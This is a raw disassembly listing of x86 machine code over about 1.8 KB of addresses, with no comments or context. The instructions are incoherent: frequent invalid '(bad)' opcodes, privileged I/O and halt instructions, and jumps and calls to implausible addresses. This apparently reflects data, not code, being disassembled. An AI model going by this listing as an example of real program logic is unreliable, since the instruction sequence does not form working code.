  41c23a:	test   DWORD PTR [esp+ebx*2+0x324d101],0xe76797
  41c245:	jnp    0x41c1ea
  41c247:	adc    al,cl
  41c249:	ins    BYTE PTR es:[edi],dx
  41c24a:	outs   dx,DWORD PTR ds:[esi]
  41c24b:	jne    0x41c2bc
  41c24d:	xchg   esp,eax
  41c24e:	cmp    al,0x5b
  41c250:	stos   DWORD PTR es:[edi],eax
  41c251:	loope  0x41c2bc
  41c253:	neg    BYTE PTR [edx]
  41c255:	sbb    al,0xf1
  41c257:	adc    esi,ebx
  41c259:	pop    ds
  41c25a:	adc    BYTE PTR [ebp-0x5c],cl
  41c25d:	fwait
  41c25e:	sbb    dh,BYTE PTR [ebx-0x11]
  41c261:	daa    
  41c262:	mov    ss,WORD PTR [ebx-0x7e]
  41c265:	xchg   DWORD PTR [eax-0x25ffeb94],edi
  41c26b:	bound  esp,QWORD PTR [edi+0x222b8f23]
  41c271:	xchg   ebp,eax
  41c272:	adc    eax,0xd77fbfa2
  41c277:	int3   
  41c278:	sahf   
  41c279:	fs pop esp
  41c27b:	rcr    BYTE PTR [ebp-0x4f],1
  41c27e:	push   ecx
  41c27f:	mov    esp,0xd96d41d
  41c284:	dec    ebp
  41c285:	and    ecx,ebx
  41c287:	dec    ecx
  41c288:	jl     0x41c229
  41c28a:	call   0xcde9969a
  41c28f:	aad    0x36
  41c291:	ins    BYTE PTR es:[edi],dx
  41c292:	sti    
  41c293:	stc    
  41c294:	bound  edi,QWORD PTR [edx]
  41c296:	enter  0xf239,0x44
  41c29a:	sub    ecx,0xffffffa2
  41c29d:	mov    ecx,0xbd862570
  41c2a2:	adc    BYTE PTR [ecx+0x2e],ah
  41c2a5:	int3   
  41c2a6:	lock add al,0x2d
  41c2a9:	fs std 
  41c2ab:	das    
  41c2ac:	push   ds
  41c2ad:	push   edx
  41c2ae:	dec    ebx
  41c2af:	jmp    0xf34f:0x98eb722
  41c2b6:	stos   DWORD PTR es:[edi],eax
  41c2b7:	mov    eax,es
  41c2b9:	adc    BYTE PTR [edx],dh
  41c2bb:	xor    ah,BYTE PTR [eax]
  41c2bd:	scas   al,BYTE PTR es:[edi]
  41c2be:	add    ecx,DWORD PTR [esp+esi*8]
  41c2c1:	lahf   
  41c2c2:	sub    al,0xf
  41c2c4:	in     al,0xac
  41c2c6:	sbb    dh,BYTE PTR [esi+0x64]
  41c2c9:	cmc    
  41c2ca:	or     eax,0x27913b71
  41c2cf:	(bad)  
  41c2d0:	aad    0xc1
  41c2d2:	cmp    eax,0xbf1e047d
  41c2d7:	jb     0x41c320
  41c2d9:	fs pop es
  41c2db:	or     cl,0x2b
  41c2de:	cmp    dh,ch
  41c2e0:	aad    0x6e
  41c2e2:	(bad)  
  41c2e3:	gs push eax
  41c2e5:	push   ebp
  41c2e6:	push   cs
  41c2e7:	out    dx,al
  41c2e8:	pop    ecx
  41c2e9:	in     al,0x57
  41c2eb:	dec    ebp
  41c2ec:	(bad)  
  41c2ed:	pop    ebp
  41c2ee:	sar    bl,cl
  41c2f0:	or     al,BYTE PTR [ebx-0x23]
  41c2f3:	idiv   ecx
  41c2f5:	xlat   BYTE PTR ds:[ebx]
  41c2f6:	inc    edi
  41c2f7:	sbb    bh,bh
  41c2f9:	(bad)  
  41c2fa:	or     al,0x42
  41c2fc:	inc    ecx
  41c2fd:	fidivr WORD PTR [edi]
  41c2ff:	and    bh,BYTE PTR [edx-0x12]
  41c302:	mov    eax,0xc4a60bed
  41c307:	pop    eax
  41c308:	jmp    0x41c2d6
  41c30a:	push   ss
  41c30b:	sbb    eax,0x4f41d99e
  41c310:	pop    edi
  41c311:	(bad)  
  41c313:	and    BYTE PTR [ecx-0x5f],ch
  41c316:	jle    0x41c36c
  41c318:	mov    ebp,0xc4e5bfc0
  41c31d:	pop    ebp
  41c31e:	mov    DWORD PTR [ecx-0x7b9f8f74],0xd8eac9ea
  41c328:	dec    eax
  41c329:	ss adc dl,dh
  41c32c:	(bad)  
  41c32d:	jo     0x41c33d
  41c32f:	retf   0x9f3
  41c332:	int3   
  41c333:	and    DWORD PTR [edx*2-0x528746ca],ebx
  41c33a:	nop
  41c33b:	inc    eax
  41c33c:	addr16 into 
  41c33e:	es inc eax
  41c340:	push   ebx
  41c341:	dec    edx
  41c342:	pop    ds
  41c343:	(bad)  
  41c344:	out    dx,al
  41c345:	jne    0x41c3aa
  41c347:	mov    eax,ds:0xddf1eb49
  41c34c:	and    DWORD PTR [edx+0xcb21037],edx
  41c352:	sub    BYTE PTR [edi+0x1e65c7fe],cl
  41c358:	stos   BYTE PTR es:[edi],al
  41c359:	pusha  
  41c35a:	rcl    BYTE PTR [edi+0x54],0xac
  41c35e:	mov    al,0x95
  41c360:	xor    ch,BYTE PTR [ecx-0x2c]
  41c363:	dec    eax
  41c364:	pop    ss
  41c365:	leave  
  41c366:	and    esp,DWORD PTR [esi]
  41c368:	and    ch,BYTE PTR [edx-0x214b84d1]
  41c36e:	dec    edi
  41c36f:	jbe    0x41c39e
  41c371:	xchg   BYTE PTR [ecx-0x10],bh
  41c374:	xlat   BYTE PTR ds:[ebx]
  41c375:	mov    ebp,0xb2f2db1e
  41c37a:	adc    dh,bl
  41c37c:	dec    ebp
  41c37d:	sbb    BYTE PTR [edx-0x503ac4b],al
  41c383:	add    BYTE PTR [edx+edi*1-0x40f4c3e0],ah
  41c38a:	call   0x31bb17b6
  41c38f:	push   edi
  41c390:	into   
  41c391:	mov    edi,0xe63ab9b0
  41c396:	sbb    bh,BYTE PTR [eax-0x27]
  41c399:	enter  0xa43b,0xa
  41c39d:	push   cs
  41c39e:	test   al,0x95
  41c3a0:	outs   dx,BYTE PTR ds:[esi]
  41c3a1:	cmp    BYTE PTR [eax+0x559dfbae],ah
  41c3a7:	sbb    BYTE PTR [edx-0x43],0x3e
  41c3ab:	add    al,0x59
  41c3ad:	jbe    0x41c3e5
  41c3af:	cwde   
  41c3b0:	fimul  WORD PTR ds:0xb3cdef9c
  41c3b6:	retf   
  41c3b7:	(bad)  
  41c3b8:	sbb    ebx,esp
  41c3ba:	xor    eax,0x6ad5d61c
  41c3bf:	add    BYTE PTR [eax+ecx*1-0x3e75edff],dl
  41c3c6:	mov    dh,0x68
  41c3c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3c9:	jge    0x41c388
  41c3cb:	imul   eax,DWORD PTR [edx-0x22],0x3e
  41c3cf:	push   ebp
  41c3d0:	mov    bh,0x16
  41c3d2:	mov    bh,0x9b
  41c3d4:	sub    al,0xcc
  41c3d6:	ret    0x7a5e
  41c3d9:	inc    edx
  41c3da:	js     0x41c392
  41c3dc:	mov    ah,0x15
  41c3de:	jbe    0x41c3f1
  41c3e0:	aam    0x1b
  41c3e2:	repnz hlt 
  41c3e4:	cmp    ecx,DWORD PTR [eax+eax*2+0x11]
  41c3e8:	pushf  
  41c3e9:	sub    eax,0x31e4f1ed
  41c3ee:	cmp    cl,BYTE PTR ss:[edi]
  41c3f1:	mov    esi,0xb786771e
  41c3f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3f7:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41c3f9:	les    esi,FWORD PTR [esi+0x774886b2]
  41c3ff:	jns    0x41c393
  41c401:	test   DWORD PTR [edi+0x681c94f9],ebp
  41c407:	lods   al,BYTE PTR ds:[esi]
  41c408:	jnp    0x41c3cd
  41c40a:	push   cs
  41c40b:	push   ecx
  41c40c:	mov    esp,ds
  41c40e:	retf   
  41c40f:	addr16 jae 0x41c456
  41c412:	in     al,dx
  41c413:	mov    bl,0x31
  41c415:	push   0xd915b8f3
  41c41a:	mov    ah,0x92
  41c41c:	scas   eax,DWORD PTR es:[edi]
  41c41d:	push   ecx
  41c41e:	mov    esi,0xe81c09e
  41c423:	pop    edx
  41c424:	push   esp
  41c425:	fisttp QWORD PTR [esi+0x72]
  41c428:	xchg   esp,eax
  41c429:	mov    DWORD PTR [eax-0x5e6d8a32],ecx
  41c42f:	in     al,0x38
  41c431:	push   0xffffffb2
  41c433:	mov    DWORD PTR [edi],ebx
  41c435:	or     al,0xc3
  41c437:	mov    ?,WORD PTR [edi]
  41c439:	mov    edi,0x53777e7
  41c43e:	inc    edi
  41c43f:	adc    al,0x94
  41c441:	mov    esp,0x8fb55455
  41c446:	mov    BYTE PTR [edx+0x4d302e4e],dh
  41c44c:	(bad)  
  41c44e:	lods   eax,DWORD PTR ds:[esi]
  41c44f:	arpl   WORD PTR [eax*1+0x5db8e4f8],bx
  41c456:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c457:	mov    bh,0x33
  41c459:	and    cl,BYTE PTR [edi+0x6ccc2886]
  41c45f:	xchg   ebp,eax
  41c460:	push   esp
  41c461:	(bad)  
  41c462:	(bad)  
  41c463:	xchg   edi,eax
  41c464:	mov    cl,0x6b
  41c467:	push   ecx
  41c468:	adc    dl,BYTE PTR fs:[esp+esi*2-0x70]
  41c46d:	(bad)  
  41c46e:	and    BYTE PTR [edi],cl
  41c470:	inc    edx
  41c471:	or     DWORD PTR [eax],ecx
  41c473:	leave  
  41c474:	push   ebp
  41c475:	mov    al,0xb
  41c477:	fimul  WORD PTR [edi+esi*8]
  41c47a:	jno    0x41c498
  41c47c:	test   DWORD PTR [ecx+0x29],esi
  41c47f:	jne    0x41c4ea
  41c481:	dec    ecx
  41c482:	fnstcw WORD PTR [edi-0x228ccbc8]
  41c488:	or     eax,0x2c6cf942
  41c48d:	loopne 0x41c48a
  41c48f:	and    DWORD PTR [edi],edx
  41c491:	push   ebx
  41c492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c493:	fisub  DWORD PTR [eax-0x4df9af44]
  41c499:	mov    ch,0x8b
  41c49b:	(bad)  [edi-0x442473dd]
  41c4a1:	xor    eax,DWORD PTR [ecx]
  41c4a3:	idiv   BYTE PTR ds:0x9cf9f593
  41c4a9:	sub    DWORD PTR [eax-0x4586dc7],ebp
  41c4af:	cwde   
  41c4b0:	scas   al,BYTE PTR es:[edi]
  41c4b1:	push   edx
  41c4b2:	dec    eax
  41c4b3:	adc    edi,DWORD PTR [ebx]
  41c4b5:	xchg   ebp,eax
  41c4b6:	cmp    DWORD PTR [edi],eax
  41c4b8:	or     bl,bh
  41c4ba:	(bad)  [ebx+esi*2]
  41c4bd:	stc    
  41c4be:	cdq    
  41c4bf:	ja     0x41c528
  41c4c1:	jg     0x41c4cb
  41c4c3:	mov    al,ds:0x2896096d
  41c4c8:	mov    cl,0x0
  41c4ca:	lods   eax,DWORD PTR ds:[esi]
  41c4cb:	(bad)  
  41c4cd:	ret    0x7f8b
  41c4d0:	adc    BYTE PTR [edx-0xfcdfd53],0x37
  41c4d7:	jg     0x41c4a1
  41c4d9:	imul   BYTE PTR [edi+eiz*2-0x7e]
  41c4dd:	xor    esp,edx
  41c4df:	rcr    BYTE PTR [ecx+edi*2+0x5490dcde],1
  41c4e6:	int    0x1f
  41c4e8:	sbb    BYTE PTR [ebx],0x4f
  41c4eb:	push   edi
  41c4ec:	outs   dx,BYTE PTR ds:[esi]
  41c4ed:	popa   
  41c4ee:	retf   0x36c6
  41c4f1:	inc    edi
  41c4f2:	or     al,0x2b
  41c4f4:	cwde   
  41c4f5:	jmp    0x41c48e
  41c4f7:	sbb    ebp,edi
  41c4f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4fa:	pusha  
  41c4fb:	sub    edx,eax
  41c4fd:	xor    eax,0x12adae8a
  41c502:	aas    
  41c503:	dec    BYTE PTR [si+0x4a]
  41c507:	xchg   ebx,eax
  41c508:	data16 ins BYTE PTR es:[edi],dx
  41c50a:	sub    BYTE PTR [ecx-0x3],cl
  41c50d:	ins    BYTE PTR es:[edi],dx
  41c50e:	shr    BYTE PTR ds:0x93b930e6,0xeb
  41c515:	ror    BYTE PTR [edi-0x488c2aab],cl
  41c51b:	xor    al,0xea
  41c51d:	push   ecx
  41c51e:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41c520:	adc    edx,DWORD PTR [ebx-0x5e]
  41c523:	adc    al,0x4a
  41c525:	jl     0x41c4d8
  41c527:	sbb    bh,BYTE PTR [ebx+0x1ca41ddd]
  41c52d:	add    ebp,ebp
  41c52f:	jmp    0x71f5:0xdc029f07
  41c536:	sbb    eax,0x1bfaaab1
  41c53b:	int    0x6b
  41c53d:	xor    eax,0x9048513e
  41c542:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c543:	pusha  
  41c544:	adc    DWORD PTR [edi+edx*2],ebp
  41c547:	jg     0x41c4ec
  41c549:	popf   
  41c54a:	sub    eax,0x555692ec
  41c54f:	adc    eax,0x6a7e2100
  41c554:	inc    ecx
  41c555:	shr    DWORD PTR [edi+0x6dc5dbaf],0x8
  41c55c:	pusha  
  41c55d:	setns  BYTE PTR [edi+0x1654611c]
  41c564:	jbe    0x41c56b
  41c566:	jecxz  0x41c52d
  41c568:	jnp    0x41c5aa
  41c56a:	bound  esi,QWORD PTR [eax+0x4e]
  41c56d:	cmp    cl,al
  41c56f:	cmc    
  41c570:	out    dx,al
  41c571:	shr    BYTE PTR [edx-0x3dc2fe7f],cl
  41c577:	push   cs
  41c578:	rol    BYTE PTR [ebp+0x69],1
  41c57b:	fisubr WORD PTR [edx-0x376511ee]
  41c581:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c582:	mov    dh,0xb8
  41c584:	iret   
  41c585:	(bad)  
  41c586:	push   ebx
  41c587:	scas   eax,DWORD PTR es:[edi]
  41c588:	jnp    0x41c55f
  41c58a:	xor    bh,al
  41c58c:	jle    0x41c5c5
  41c58e:	stos   BYTE PTR es:[edi],al
  41c58f:	inc    esp
  41c590:	arpl   WORD PTR ss:[edx+0x2907008],si
  41c597:	lds    edi,FWORD PTR [eiz*8-0x2dab96ab]
  41c59e:	out    0x5,eax
  41c5a0:	jbe    0x41c57e
  41c5a2:	or     eax,0x4f365de3
  41c5a7:	sbb    ecx,eax
  41c5a9:	and    al,ah
  41c5ab:	push   cs
  41c5ac:	call   0xffcd:0x8b8df70b
  41c5b3:	and    al,0xa2
  41c5b5:	arpl   di,bx
  41c5b7:	or     BYTE PTR [ebx+0x1],0xc
  41c5bb:	mov    ch,BYTE PTR [ebp-0x4a]
  41c5be:	sar    ebp,1
  41c5c0:	sti    
  41c5c1:	mov    eax,ds:0xca5aeb38
  41c5c6:	lods   al,BYTE PTR ds:[esi]
  41c5c7:	nop
  41c5c8:	test   BYTE PTR [ebx-0x13],ch
  41c5cb:	out    0x3f,eax
  41c5cd:	rcr    edx,cl
  41c5cf:	push   es
  41c5d0:	push   edi
  41c5d1:	loopne 0x41c59a
  41c5d3:	leave  
  41c5d4:	xchg   edx,eax
  41c5d5:	jmp    0x41c598
  41c5d7:	lock aam 0xfe
  41c5da:	hlt    
  41c5db:	adc    DWORD PTR [ebx],esp
  41c5dd:	jno    0x41c60f
  41c5df:	xor    BYTE PTR [eax+0x12520628],dl
  41c5e5:	add    al,0xa2
  41c5e7:	add    ebx,DWORD PTR [ebx]
  41c5e9:	adc    DWORD PTR [ecx+0x75256af7],edi
  41c5ef:	pop    esp
  41c5f0:	or     DWORD PTR ss:[eax-0x3c1cf179],ebp
  41c5f7:	sub    DWORD PTR [edx],0x5261f0a9
  41c5fd:	outs   dx,BYTE PTR ds:[esi]
  41c5fe:	mov    esi,0xa9f4de8e
  41c603:	push   ebp
  41c604:	pop    edi
  41c605:	sub    DWORD PTR [ebp+0x1064dc9b],eax
  41c60b:	or     DWORD PTR ss:[esi+0x410988b0],ebx
  41c612:	push   ebx
  41c613:	sbb    eax,0x185a5ece
  41c618:	dec    ebp
  41c619:	xchg   edi,eax
  41c61a:	mov    bh,0x91
  41c61c:	in     al,dx
  41c61d:	jbe    0x41c69e
  41c61f:	cmc    
  41c620:	mov    edx,0x762c1ce8
  41c625:	shr    BYTE PTR [eax-0x4d],cl
  41c628:	in     al,dx
  41c629:	outs   dx,DWORD PTR ds:[esi]
  41c62a:	paddd  mm4,QWORD PTR [esi-0x1f]
  41c62e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c62f:	push   esi
  41c630:	mov    ebx,0x23392e81
  41c635:	fcomp  QWORD PTR [edi]
  41c637:	iret   
  41c638:	lods   eax,DWORD PTR ds:[esi]
  41c639:	adc    eax,0x30f256d
  41c63e:	nop
  41c63f:	push   eax
  41c640:	js     0x41c5d1
  41c642:	aam    0x32
  41c644:	(bad)  
  41c646:	ret    
  41c647:	cmp    ebp,ebx
  41c649:	add    eax,0x311752d6
  41c64e:	loop   0x41c5f4
  41c650:	not    BYTE PTR [ebx-0x2b]
  41c653:	imul   eax,DWORD PTR [ebp+0x6f],0x7e
  41c657:	and    BYTE PTR [ebx],dl
  41c659:	mov    edx,0x27354739
  41c65e:	rcl    BYTE PTR [edi-0x33],0x7c
  41c662:	loop   0x41c610
  41c664:	bound  ecx,QWORD PTR [eax+eiz*4+0x1918e05b]
  41c66b:	shl    BYTE PTR [ecx-0x21dd4ff7],cl
  41c671:	or     al,0xb5
  41c673:	pop    esi
  41c674:	cmp    dh,BYTE PTR [eax-0x5e]
  41c677:	push   edx
  41c678:	mov    edi,edi
  41c67a:	mov    esi,0xda191d9b
  41c67f:	xchg   ecx,eax
  41c680:	std    
  41c681:	or     cl,BYTE PTR [edi-0x5332b5d9]
  41c687:	ja     0x41c660
  41c689:	fcom   QWORD PTR [ebp-0x6fd9f8b2]
  41c68f:	fld    st(2)
  41c691:	(bad)  
  41c692:	jbe    0x41c6e1
  41c694:	cmp    al,dh
  41c696:	in     eax,0x20
  41c698:	repnz out 0xf,eax
  41c69b:	fild   QWORD PTR [esp+eiz*8]
  41c69e:	test   BYTE PTR [esi-0x37313609],dl
  41c6a4:	pop    es
  41c6a5:	(bad)  
  41c6a6:	(bad)  
  41c6a7:	stos   BYTE PTR es:[edi],al
  41c6a8:	lea    edx,[ebp+esi*4+0x2557147a]
  41c6af:	and    esp,DWORD PTR ds:0xf78a2e89
  41c6b5:	adc    eax,0xd98a16f5
  41c6ba:	nop
  41c6bb:	mov    db2,ecx
  41c6be:	xor    al,0xfc
  41c6c0:	jae    0x41c709
  41c6c2:	xlat   BYTE PTR ds:[ebx]
  41c6c3:	not    dl
  41c6c5:	pop    eax
  41c6c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6c7:	ds shr cl,0x6e
  41c6cb:	mov    ch,dl
  41c6cd:	add    eax,0xa67c7308
  41c6d2:	adc    ah,al
  41c6d4:	push   DWORD PTR [ebx]
  41c6d6:	inc    esi
  41c6d7:	lahf   
  41c6d8:	adc    DWORD PTR [ecx+0x4d335b0d],0xffffff89
  41c6df:	xchg   dh,bl
  41c6e1:	inc    ecx
  41c6e2:	mov    ebp,0xd72ba850
  41c6e7:	dec    esp
  41c6e8:	inc    ecx
  41c6e9:	sbb    eax,0x222cf86a
  41c6ee:	jne    0x41c69c
  41c6f0:	sub    DWORD PTR ds:0x5f349642,ecx
  41c6f6:	cmp    bh,bh
  41c6f8:	jo     0x41c737
  41c6fa:	popf   
  41c6fb:	arpl   WORD PTR [edi+0x36],bx
  41c6fe:	into   
  41c6ff:	(bad)  
  41c701:	push   ds
  41c702:	inc    edx
  41c703:	inc    esp
  41c704:	or     al,0xab
  41c706:	cmp    eax,0x25f43959
  41c70b:	fldcw  WORD PTR [edx-0x7bda90ca]
  41c711:	(bad)  
  41c712:	cmp    BYTE PTR [esi],al
  41c714:	loope  0x41c6f2
  41c716:	and    eax,0xbb7b74c8
  41c71b:	hlt    
  41c71c:	dec    ebp
  41c71d:	pop    edx
  41c71e:	adc    DWORD PTR [ecx+0x49],ebx
  41c721:	ret    0x3973
  41c724:	jns    0x41c6b8
  41c726:	ins    BYTE PTR es:[edi],dx
  41c727:	cwde   
  41c728:	out    dx,eax
  41c729:	mov    ah,0xc2
  41c72b:	sub    eax,0x8a2ba2a2
  41c730:	pop    eax
  41c731:	and    eax,DWORD PTR [edi+esi*4]
  41c734:	inc    ebx
  41c735:	lods   eax,DWORD PTR ds:[esi]
  41c736:	push   ds
  41c737:	(bad)  
  41c738:	fxch   st(2)
  41c73a:	je     0x41c722
  41c73c:	icebp  
  41c73d:	or     DWORD PTR [ebx],edx
  41c73f:	mov    dl,0x49
  41c741:	add    al,0x65
  41c743:	mov    al,ds:0x70418ec4
  41c748:	repnz lods al,BYTE PTR ds:[esi]
  41c74a:	pop    esp
  41c74b:	sbb    ah,BYTE PTR [edi-0x2b9cb982]
  41c751:	retf   
  41c752:	retf   0xb474
  41c755:	dec    ebp
  41c756:	fcom   QWORD PTR [ebx]
  41c758:	hlt    
  41c759:	sbb    DWORD PTR [eax+eax*8+0x4d],edi
  41c75d:	sub    al,0x23
  41c75f:	xor    BYTE PTR [edx],ch
  41c761:	pop    ecx
  41c762:	push   ds
  41c763:	test   eax,0x169cd6e6
  41c768:	cdq    
  41c769:	mov    bh,0xa0
  41c76b:	or     esp,DWORD PTR [edi+edx*2-0x28]
  41c76f:	sti    
  41c770:	addr16 sub eax,0x31185766
  41c776:	push   0xffffff91
  41c778:	hlt    
  41c779:	sbb    ch,BYTE PTR [eax]
  41c77b:	add    ch,BYTE PTR [bp+si+0x66]
  41c77f:	cwde   
  41c780:	sbb    BYTE PTR [edx+ebx*2-0x5359a16],cl
  41c787:	fstp   DWORD PTR [edi-0x5320228a]
  41c78d:	sbb    al,0x47
  41c78f:	inc    ecx
  41c790:	loopne 0x41c73e
  41c792:	pop    ecx
  41c793:	add    eax,0x1a7fe505
  41c798:	data16 lock popaw 
  41c79c:	into   
  41c79d:	fbld   TBYTE PTR [edi+0x432f4dfc]
  41c7a3:	test   al,al
  41c7a5:	mov    WORD PTR [edx-0x30f3ed8d],?
  41c7ab:	adc    DWORD PTR [edi+0x19],ecx
  41c7ae:	in     al,0x65
  41c7b0:	fistp  DWORD PTR [ecx+0x4b5e4efb]
  41c7b6:	mov    al,0x7c
  41c7b8:	push   esp
  41c7b9:	push   edx
  41c7ba:	xor    ah,bh
  41c7bc:	inc    esp
  41c7bd:	aaa    
  41c7be:	call   0xe44e3fa2
  41c7c3:	push   edx
  41c7c4:	mov    ds:0xb7f5aa1f,al
  41c7c9:	div    edx
  41c7cb:	or     dh,ah
  41c7cd:	jb     0x41c819
  41c7cf:	jae    0x41c848
  41c7d1:	lahf   
  41c7d2:	push   0x76
  41c7d4:	icebp  
  41c7d5:	rol    DWORD PTR [ecx+0x73],0xd6
  41c7d9:	rol    BYTE PTR [ebp+ecx*4-0x7d3aa802],cl
  41c7e0:	xor    bh,BYTE PTR [esi]
  41c7e2:	mov    ebp,0xfc160c4
  41c7e7:	arpl   WORD PTR [edx+0xa],cx
  41c7ea:	push   edi
  41c7eb:	cwde   
  41c7ec:	ret    
  41c7ed:	xor    eax,0xff2449ce
  41c7f2:	sbb    al,0x3
  41c7f4:	sahf   
  41c7f5:	fisttp WORD PTR [edi-0x43]
  41c7f8:	ret    0x13a0
  41c7fb:	cmp    dh,BYTE PTR [edx+0x71]
  41c7fe:	out    0x5a,eax
  41c800:	icebp  
  41c801:	mov    bh,0x5f
  41c803:	into   
  41c804:	xor    ch,dl
  41c806:	dec    edx
  41c807:	cs and ecx,ebx
  41c80a:	ror    BYTE PTR [eax],1
  41c80c:	sbb    DWORD PTR [edi],esi
  41c80e:	sti    
  41c80f:	mov    dl,0x41
  41c811:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c812:	ins    DWORD PTR es:[edi],dx
  41c813:	push   ebp
  41c814:	sbb    al,0x81
  41c816:	jmp    0x41c7f6
  41c818:	dec    edi
  41c819:	jb     0x41c7a9
  41c81b:	mov    edi,0xf23b72
  41c820:	sbb    ecx,DWORD PTR [ecx+0x2b]
  41c823:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c824:	or     bl,BYTE PTR [esi+ebp*8]
  41c827:	xlat   BYTE PTR ds:[ebx]
  41c828:	retf   0x7d3f
  41c82b:	dec    edi
  41c82c:	adc    ebp,DWORD PTR [edi-0x1848aa06]
  41c832:	and    al,0xbf
  41c834:	push   cs
  41c835:	inc    esp
  41c836:	sub    al,0x16
  41c838:	xchg   esp,eax
  41c839:	test   DWORD PTR [edx],esi
  41c83b:	xchg   ebx,eax
  41c83c:	dec    edi
  41c83d:	outs   dx,DWORD PTR ds:[esi]
  41c83e:	xor    esp,DWORD PTR [ebx+0x4e]
  41c841:	pop    edx
  41c842:	aad    0x64
  41c844:	sub    ebp,eax
  41c846:	xlat   BYTE PTR ds:[ebx]
  41c847:	adc    al,0x18
  41c849:	cmc    
  41c84a:	lds    eax,FWORD PTR [ecx]
  41c84c:	mov    BYTE PTR [ebp+0x1616474c],al
  41c852:	mov    cl,dl
  41c854:	aaa    
  41c855:	xchg   DWORD PTR [ecx],edx
  41c857:	or     eax,0xe1530bdb
  41c85c:	fst    QWORD PTR [eax]
  41c85e:	mov    bl,BYTE PTR [edi+0x48432ac2]
  41c864:	and    BYTE PTR [esi+ebp*1+0x45],al
  41c868:	mov    dh,0xab
  41c86a:	push   ebx
  41c86b:	cmp    BYTE PTR [edx-0x677febc2],bh
  41c871:	jae    0x41c81c
  41c873:	xor    bl,bh
  41c875:	pop    ecx
  41c876:	mov    dl,0x61
  41c878:	xchg   ecx,eax
  41c87a:	pop    edi
  41c87b:	push   esi
  41c87c:	xchg   DWORD PTR [ebx+eax*2-0x3da38bd0],edi
  41c883:	mov    cl,0x78
  41c885:	or     eax,0x5378e6b6
  41c88a:	ficomp DWORD PTR ds:0x9e332922
  41c890:	aam    0x6
  41c892:	fadd   st,st(6)
  41c894:	shr    DWORD PTR [edi],1
  41c896:	pop    ebp
  41c897:	inc    esi
  41c898:	cld    
  41c899:	fadd   DWORD PTR [ebx+0x39]
  41c89c:	fidivr WORD PTR [eax]
  41c89e:	out    dx,eax
  41c89f:	div    BYTE PTR [esi+esi*1-0x73]
  41c8a3:	jae    0x41c8f5
  41c8a5:	aaa    
  41c8a6:	gs mov ah,0xfb
  41c8a9:	push   ds
  41c8aa:	jge    0x41c8e0
  41c8ac:	mov    ch,0x34
  41c8ae:	ja     0x41c8aa
  41c8b0:	mov    cl,0x5
  41c8b2:	cwde   
  41c8b3:	pusha  
  41c8b4:	xchg   BYTE PTR [ecx],dl
  41c8b6:	in     al,dx
  41c8b7:	cmp    BYTE PTR ds:0x76be2b99,dh
  41c8bd:	sub    al,0xf4
  41c8bf:	shl    BYTE PTR [edi+ebx*4],cl
  41c8c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8c3:	enter  0x5bb,0xff
  41c8c7:	mov    bl,0x4c
  41c8c9:	jbe    0x41c8a1
  41c8cb:	xchg   ecx,eax
  41c8cc:	xor    dl,BYTE PTR ds:0x6e41aa37
  41c8d2:	sub    dh,dl
  41c8d4:	add    bh,ch
  41c8d6:	aam    0x97
  41c8d8:	inc    ebx
  41c8d9:	cmc    
  41c8da:	and    BYTE PTR [ebx-0x2b],dl
  41c8dd:	cmp    dh,ch
  41c8df:	js     0x41c91d
  41c8e1:	and    eax,0x24167400
  41c8e6:	mov    cl,0xcb
  41c8e8:	pop    eax
  41c8e9:	jmp    0x4f06bbc9
  41c8ee:	mov    DWORD PTR [edi-0x78],ebp
  41c8f1:	into   
  41c8f2:	pmaxsw mm6,QWORD PTR [edi]
  41c8f5:	fild   DWORD PTR [ecx-0x62]
  41c8f8:	inc    esi
  41c8f9:	jg     0x41c926
  41c8fb:	mov    ds,eax
  41c8fd:	gs jge 0x41c92c
  41c900:	cmp    dh,BYTE PTR [eax]
  41c902:	inc    ebx
  41c903:	scas   eax,DWORD PTR es:[edi]
  41c904:	mov    edx,DWORD PTR [eax-0x7d3aeeab]
  41c90a:	daa    
  41c90b:	push   0xffffffed
  41c90d:	stos   DWORD PTR es:[edi],eax
  41c90e:	cs cli 
  41c910:	sub    eax,0xd62964
  41c915:	cld    
  41c916:	int3   
  41c917:	ins    BYTE PTR es:[edi],dx
  41c918:	sti    
  41c919:	push   0x5827e391
  41c91e:	fxch   st(7)
  41c920:	sahf   
  41c921:	jbe    0x41c964
  41c923:	xor    al,0xf9
  41c925:	fbld   TBYTE PTR [ecx+0x16]
  41c928:	mov    esp,DWORD PTR [ebp+0x560939d7]
  41c92e:	popa   
  41c92f:	imul   esi,DWORD PTR [edi+ecx*4-0x3e667b50],0x36
  41c937:	(bad)  
  41c938:	js     0x41c959
  41c93a:	call   0xc674af13
  41c93f:	(bad)  
  41c940:	out    dx,eax
  41c941:	addr16 inc eax
  41c943:	(bad)  
  41c945:	scas   al,BYTE PTR es:[edi]
  41c946:	inc    edx
  41c947:	xor    BYTE PTR [eax+0x69],bl
  41c94a:	gs in  eax,0xdd
  41c94d:	pop    ss
  41c94e:	rep stos DWORD PTR es:[edi],eax
  41c950:	imul   edx,DWORD PTR [edx+0x748045f0],0xffffffee
  41c957:	and    eax,0xf511b0c6
  41c95c:	pop    ecx
  41c95d:	cs hlt 
  41c95f:	test   al,0x43
  41c961:	call   FWORD PTR [edi+0x26a3997a]
  41c967:	stos   BYTE PTR es:[edi],al
  41c968:	mov    bh,0x13
  41c96a:	mov    ch,0xf
  41c96c:	mov    ecx,0x4842f1
  41c971:	xchg   BYTE PTR [eax],dl
  41c973:	jmp    0x53af:0xbeffca4c
  41c97a:	dec    eax
  41c97b:	adc    bl,BYTE PTR [edx+ebp*4-0x7428b017]
  41c982:	xchg   edx,eax
  41c983:	popa   
  41c984:	xchg   esi,eax
  41c985:	scas   al,BYTE PTR es:[edi]
  41c986:	sbb    BYTE PTR [ebp+0x13071c4a],0xe9
